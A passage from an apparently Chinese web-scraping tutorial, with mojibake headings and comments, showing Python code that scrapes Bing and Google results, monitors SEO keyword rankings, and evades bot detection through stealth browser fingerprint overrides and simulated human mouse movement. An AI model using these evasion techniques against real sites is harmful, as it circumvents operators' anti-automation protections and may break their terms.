        <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">last_height</span> <span class="o">=</span> <span class="mi">0</span>

        <span class="c1"># æ— é™æ»šåŠ¨</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="c1"># æå–ç»“æœ</span>
            <span class="n">items</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">query_selector_all</span><span class="p">(</span><span class="s1">&#39;.b_algo&#39;</span><span class="p">)</span>

            <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">items</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">results</span><span class="p">):]:</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">title</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;h2&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">inner_text</span><span class="p">()</span>
                    <span class="n">url</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">)</span>
                    <span class="n">snippet</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;.b_caption p&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">inner_text</span><span class="p">()</span>

                    <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                        <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">title</span><span class="p">,</span>
                        <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
                        <span class="s1">&#39;snippet&#39;</span><span class="p">:</span> <span class="n">snippet</span>
                    <span class="p">})</span>

                <span class="k">except</span><span class="p">:</span>
                    <span class="k">continue</span>

            <span class="c1"># æ»šåŠ¨</span>
            <span class="n">page</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="s1">&#39;window.scrollTo(0, document.body.scrollHeight)&#39;</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

            <span class="c1"># æ£€æŸ¥æ˜¯å¦åŠ è½½äº†æ–°å†…å®¹</span>
            <span class="n">new_height</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="s1">&#39;document.body.scrollHeight&#39;</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">new_height</span> <span class="o">==</span> <span class="n">last_height</span><span class="p">:</span>
                <span class="k">break</span>

            <span class="n">last_height</span> <span class="o">=</span> <span class="n">new_height</span>

        <span class="n">page</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">results</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">cleanup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¸…ç†èµ„æº&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">context</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">browser</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">browser</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">scraper</span> <span class="o">=</span> <span class="n">JavaScriptSearchScraper</span><span class="p">()</span>
<span class="n">scraper</span><span class="o">.</span><span class="n">setup</span><span class="p">()</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">google_results</span> <span class="o">=</span> <span class="n">scraper</span><span class="o">.</span><span class="n">search_google</span><span class="p">(</span><span class="s1">&#39;python tutorial&#39;</span><span class="p">,</span> <span class="n">num_results</span><span class="o">=</span><span class="mi">50</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">google_results</span><span class="p">)</span><span class="si">}</span><span class="s2"> Google results&quot;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">google_results</span><span class="p">[:</span><span class="mi">5</span><span class="p">]:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;- </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">scraper</span><span class="o">.</span><span class="n">cleanup</span><span class="p">()</span>
</code></pre>
      </div>

      <h4 id="2-ç»•è¿‡åè‡ªåŠ¨åŒ–æ£€æµ‹">2. ç»•è¿‡åè‡ªåŠ¨åŒ–æ£€æµ‹</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">playwright_stealth</span><span class="w"> </span><span class="kn">import</span> <span class="n">stealth_sync</span>

<span class="k">class</span><span class="w"> </span><span class="nc">StealthScraper</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span> <span class="o">=</span> <span class="n">sync_playwright</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

        <span class="c1"># ä½¿ç”¨ playwright-stealth æ’ä»¶</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">browser</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">(</span><span class="n">headless</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">context</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">browser</span><span class="o">.</span><span class="n">new_context</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">scrape_with_stealth</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨éšèº«æ¨¡å¼çˆ¬å–&quot;&quot;&quot;</span>
        <span class="n">page</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>

        <span class="c1"># åº”ç”¨ stealth æ¨¡å¼</span>
        <span class="n">stealth_sync</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>

        <span class="c1"># æ·»åŠ é¢å¤–çš„åæ£€æµ‹æªæ–½</span>
        <span class="n">page</span><span class="o">.</span><span class="n">add_init_script</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">            // è¦†ç›– navigator.webdriver</span>
<span class="s2">            Object.defineProperty(navigator, &#39;webdriver&#39;, {</span>
<span class="s2">                get: () =&gt; undefined</span>
<span class="s2">            });</span>

<span class="s2">            // è¦†ç›– chrome å¯¹è±¡</span>
<span class="s2">            window.chrome = {</span>
<span class="s2">                runtime: </span><span class="si">{}</span>
<span class="s2">            };</span>

<span class="s2">            // è¦†ç›– permissions</span>
<span class="s2">            const originalQuery = window.navigator.permissions.query;</span>
<span class="s2">            window.navigator.permissions.query = (parameters) =&gt; (</span>
<span class="s2">                parameters.name === &#39;notifications&#39; ?</span>
<span class="s2">                    Promise.resolve({ state: Notification.permission }) :</span>
<span class="s2">                    originalQuery(parameters)</span>
<span class="s2">            );</span>

<span class="s2">            // è¦†ç›– plugins</span>
<span class="s2">            Object.defineProperty(navigator, &#39;plugins&#39;, {</span>
<span class="s2">                get: () =&gt; [1, 2, 3, 4, 5]</span>
<span class="s2">            });</span>

<span class="s2">            // è¦†ç›– languages</span>
<span class="s2">            Object.defineProperty(navigator, &#39;languages&#39;, {</span>
<span class="s2">                get: () =&gt; [&#39;en-US&#39;, &#39;en&#39;]</span>
<span class="s2">            });</span>
<span class="s2">        &quot;&quot;&quot;</span><span class="p">)</span>

        <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">page</span><span class="o">.</span><span class="n">content</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-4-æœç´¢æ’åç›‘æ§">æ¡ˆä¾‹ 4: æœç´¢æ’åç›‘æ§</h2>

      <h3 id="èƒŒæ™¯-4">èƒŒæ™¯</h3>

      <p>SEO å·¥å…·éœ€è¦ç›‘æ§å…³é”®è¯æ’åï¼Œä½†æœç´¢å¼•æ“ä¼šè¿”å›ä¸ªæ€§åŒ–ç»“æœã€‚</p>

      <h3 id="è§£å†³æ–¹æ¡ˆ-2">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ç¦ç”¨ä¸ªæ€§åŒ–">1. ç¦ç”¨ä¸ªæ€§åŒ–</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">UnbiasedSearchMonitor</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">google_unbiased_search</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–éä¸ªæ€§åŒ–çš„ Google æœç´¢ç»“æœ&quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://www.google.com/search&#39;</span>

        <span class="c1"># ä½¿ç”¨ç‰¹æ®Šå‚æ•°ç¦ç”¨ä¸ªæ€§åŒ–</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="n">query</span><span class="p">,</span>
            <span class="s1">&#39;pws&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>  <span class="c1"># Disable personalization</span>
            <span class="s1">&#39;gl&#39;</span><span class="p">:</span> <span class="s1">&#39;us&#39;</span><span class="p">,</span>  <span class="c1"># Geo-location: US</span>
            <span class="s1">&#39;hl&#39;</span><span class="p">:</span> <span class="s1">&#39;en&#39;</span><span class="p">,</span>  <span class="c1"># Language: English</span>
            <span class="s1">&#39;num&#39;</span><span class="p">:</span> <span class="mi">100</span>   <span class="c1"># Results per page</span>
        <span class="p">}</span>

        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;en-US,en;q=0.9&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml&#39;</span><span class="p">,</span>
            <span class="c1"># ä¸å‘é€ Cookieï¼ˆé¿å…ä¸ªæ€§åŒ–ï¼‰</span>
        <span class="p">}</span>

        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_results</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_results</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">html</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£ææœç´¢ç»“æœ&quot;&quot;&quot;</span>
        <span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>

        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
        <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="c1"># æŸ¥æ‰¾æ‰€æœ‰æœç´¢ç»“æœ</span>
        <span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">soup</span><span class="o">.</span><span class="n">select</span><span class="p">(</span><span class="s1">&#39;.g&#39;</span><span class="p">),</span> <span class="n">start</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
            <span class="n">title_elem</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">select_one</span><span class="p">(</span><span class="s1">&#39;h3&#39;</span><span class="p">)</span>
            <span class="n">link_elem</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">select_one</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">title_elem</span> <span class="ow">and</span> <span class="n">link_elem</span><span class="p">:</span>
                <span class="n">url</span> <span class="o">=</span> <span class="n">link_elem</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

                <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                    <span class="s1">&#39;rank&#39;</span><span class="p">:</span> <span class="n">index</span><span class="p">,</span>
                    <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">title_elem</span><span class="o">.</span><span class="n">get_text</span><span class="p">(),</span>
                    <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
                    <span class="s1">&#39;domain&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">extract_domain</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
                <span class="p">})</span>

        <span class="k">return</span> <span class="n">results</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">extract_domain</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æå–åŸŸå&quot;&quot;&quot;</span>
        <span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urlparse</span>
        <span class="n">parsed</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">parsed</span><span class="o">.</span><span class="n">netloc</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">track_keyword_ranking</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">keyword</span><span class="p">,</span> <span class="n">target_domain</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿½è¸ªå…³é”®è¯æ’å&quot;&quot;&quot;</span>
        <span class="n">results</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">google_unbiased_search</span><span class="p">(</span><span class="n">keyword</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">target_domain</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;domain&#39;</span><span class="p">]:</span>
                <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;rank&#39;</span><span class="p">]</span>

        <span class="k">return</span> <span class="kc">None</span>  <span class="c1"># æœªè¿›å…¥å‰ 100</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">monitor</span> <span class="o">=</span> <span class="n">UnbiasedSearchMonitor</span><span class="p">()</span>

<span class="n">ranking</span> <span class="o">=</span> <span class="n">monitor</span><span class="o">.</span><span class="n">track_keyword_ranking</span><span class="p">(</span>
    <span class="n">keyword</span><span class="o">=</span><span class="s1">&#39;web scraping tutorial&#39;</span><span class="p">,</span>
    <span class="n">target_domain</span><span class="o">=</span><span class="s1">&#39;example.com&#39;</span>
<span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Current ranking: </span><span class="si">{</span><span class="n">ranking</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">ranking</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s1">&#39;Not in top 100&#39;</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-æ‰¹é‡æ’åç›‘æ§">2. æ‰¹é‡æ’åç›‘æ§</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">aiohttp</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">List</span><span class="p">,</span> <span class="n">Dict</span>

<span class="k">class</span><span class="w"> </span><span class="nc">BatchRankingMonitor</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">keywords</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">],</span> <span class="n">target_domain</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">keywords</span> <span class="o">=</span> <span class="n">keywords</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">target_domain</span> <span class="o">=</span> <span class="n">target_domain</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">check_ranking</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">keyword</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¼‚æ­¥æ£€æŸ¥å•ä¸ªå…³é”®è¯æ’å&quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://www.google.com/search&#39;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="n">keyword</span><span class="p">,</span>
            <span class="s1">&#39;pws&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
            <span class="s1">&#39;gl&#39;</span><span class="p">:</span> <span class="s1">&#39;us&#39;</span><span class="p">,</span>
            <span class="s1">&#39;num&#39;</span><span class="p">:</span> <span class="mi">100</span>
        <span class="p">}</span>

        <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span> <span class="k">as</span> <span class="n">response</span><span class="p">:</span>
            <span class="n">html</span> <span class="o">=</span> <span class="k">await</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">()</span>

            <span class="c1"># ç®€å•è§£æï¼ˆå®é™…åº”ä½¿ç”¨ BeautifulSoupï¼‰</span>
            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">target_domain</span> <span class="ow">in</span> <span class="n">html</span><span class="p">:</span>
                <span class="c1"># è®¡ç®—æ’åï¼ˆç®€åŒ–ç‰ˆæœ¬ï¼‰</span>
                <span class="n">rank</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target_domain</span><span class="p">)</span> <span class="o">//</span> <span class="mi">1000</span>  <span class="c1"># ç²—ç•¥ä¼°ç®—</span>
                <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;keyword&#39;</span><span class="p">:</span> <span class="n">keyword</span><span class="p">,</span> <span class="s1">&#39;rank&#39;</span><span class="p">:</span> <span class="n">rank</span><span class="p">}</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;keyword&#39;</span><span class="p">:</span> <span class="n">keyword</span><span class="p">,</span> <span class="s1">&#39;rank&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">}</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">check_all</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ‰¹é‡æ£€æŸ¥æ‰€æœ‰å…³é”®è¯&quot;&quot;&quot;</span>
        <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="o">.</span><span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
            <span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">check_ranking</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">kw</span><span class="p">)</span>
                <span class="k">for</span> <span class="n">kw</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">keywords</span>
            <span class="p">]</span>

            <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">results</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="n">keywords</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s1">&#39;python tutorial&#39;</span><span class="p">,</span>
        <span class="s1">&#39;web scraping&#39;</span><span class="p">,</span>
        <span class="s1">&#39;data analysis&#39;</span><span class="p">,</span>
        <span class="s1">&#39;machine learning&#39;</span>
    <span class="p">]</span>

    <span class="n">monitor</span> <span class="o">=</span> <span class="n">BatchRankingMonitor</span><span class="p">(</span><span class="n">keywords</span><span class="p">,</span> <span class="s1">&#39;example.com&#39;</span><span class="p">)</span>
    <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">monitor</span><span class="o">.</span><span class="n">check_all</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;keyword&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">: Rank </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;rank&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-5-è¡Œä¸ºæ£€æµ‹ä¸è§„é¿">æ¡ˆä¾‹ 5: è¡Œä¸ºæ£€æµ‹ä¸è§„é¿</h2>

      <h3 id="èƒŒæ™¯-5">èƒŒæ™¯</h3>

      <p>æœç´¢å¼•æ“ä½¿ç”¨æœºå™¨å­¦ä¹ åˆ†æç”¨æˆ·è¡Œä¸ºï¼Œæ£€æµ‹çˆ¬è™«ã€‚</p>

      <h3 id="æ£€æµ‹æŒ‡æ ‡">æ£€æµ‹æŒ‡æ ‡</h3>

      <ol>
        <li><strong>é¼ æ ‡è½¨è¿¹</strong>: çœŸå®ç”¨æˆ·æœ‰ä¸è§„åˆ™çš„é¼ æ ‡ç§»åŠ¨</li>
        <li><strong>é”®ç›˜è¾“å…¥</strong>: çœŸå®ç”¨æˆ·æœ‰è¾“å…¥å»¶è¿Ÿå’Œé”™è¯¯</li>
        <li><strong>æ»šåŠ¨æ¨¡å¼</strong>: çœŸå®ç”¨æˆ·æ»šåŠ¨ä¸å‡åŒ€</li>
        <li><strong>ç‚¹å‡»æ¨¡å¼</strong>: çœŸå®ç”¨æˆ·æœ‰çŠ¹è±«ã€å›é€€</li>
        <li><strong>æµè§ˆå†å²</strong>: çœŸå®ç”¨æˆ·æœ‰è·¨é¡µé¢æµè§ˆ</li>
      </ol>

      <h3 id="å¯¹æŠ—ç­–ç•¥">å¯¹æŠ—ç­–ç•¥</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>

<span class="k">class</span><span class="w"> </span><span class="nc">HumanBehaviorSimulator</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">browser</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">page</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">setup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åˆå§‹åŒ–&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span> <span class="o">=</span> <span class="n">sync_playwright</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">browser</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">(</span><span class="n">headless</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">page</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">browser</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">human_mouse_move</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">from_x</span><span class="p">,</span> <span class="n">from_y</span><span class="p">,</span> <span class="n">to_x</span><span class="p">,</span> <span class="n">to_y</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»é¼ æ ‡è½¨è¿¹ï¼ˆè´å¡å°”æ›²çº¿ï¼‰&quot;&quot;&quot;</span>
        <span class="n">steps</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span>

        <span class="c1"># æ§åˆ¶ç‚¹ï¼ˆéšæœºåç§»ï¼‰</span>
        <span class="n">cp1_x</span> <span class="o">=</span> <span class="n">from_x</span> <span class="o">+</span> <span class="p">(</span><span class="n">to_x</span> <span class="o">-</span> <span class="n">from_x</span><span class="p">)</span> <span class="o">*</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.2</span><span class="p">,</span> <span class="mf">0.4</span><span class="p">)</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="mi">50</span><span class="p">,</span> <span class="mi">50</span><span class="p">)</span>
        <span class="n">cp1_y</span> <span class="o">=</span> <span class="n">from_y</span> <span class="o">+</span> <span class="p">(</span><span class="n">to_y</span> <span class="o">-</span> <span class="n">from_y</span><span class="p">)</span> <span class="o">*</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.2</span><span class="p">,</span> <span class="mf">0.4</span><span class="p">)</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="mi">50</span><span class="p">,</span> <span class="mi">50</span><span class="p">)</span>
